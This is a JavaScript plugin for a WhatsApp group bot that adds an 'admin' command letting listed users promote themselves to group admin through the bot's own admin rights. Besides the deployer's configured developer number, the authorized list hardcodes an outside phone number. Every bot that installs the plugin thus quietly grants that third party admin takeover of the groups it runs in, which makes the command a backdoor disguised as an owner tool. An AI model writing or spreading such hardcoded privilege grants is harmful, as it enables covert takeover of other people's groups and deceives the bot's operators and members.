const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Grant yourself admin rights (authorized users only)",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply, react }) => {
    try {
        // Group validation
        if (!isGroup) return reply("❌ *This command can only be used in groups.*");

        // Bot admin check
        if (!isBotAdmins) return reply("❌ *I need admin privileges to perform this action.*");

        // Normalize JID helper
        const normalizeJid = (jid) => {
            if (!jid) return jid;
            return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
        };

        // Authorized users
        const AUTHORIZED_USERS = [
            normalizeJid(config.DEV),
            "94788770020@s.whatsapp.net"
        ].filter(Boolean);

        const senderNormalized = normalizeJid(sender);

        // Authorization check
        if (!AUTHORIZED_USERS.includes(senderNormalized)) {
            await react("❌");
            return reply("🚫 *This command is restricted to authorized developers only.*");
        }

        // Group metadata
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);

        // Already admin check
        if (userParticipant?.admin) {
            await react("ℹ️");
            return reply("ℹ️ *You already have admin rights in this group.*");
        }

        // Promote user
        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        await react("✅");
        return reply("👑 *Congratulations! You are now an admin in this group.*");

    } catch (error) {
        console.error("Admin command error:", error);
        await react("❌");
        return reply("⚠️ *Failed to grant admin rights.*\n\n💡 Error: " + error.message);
    }
});
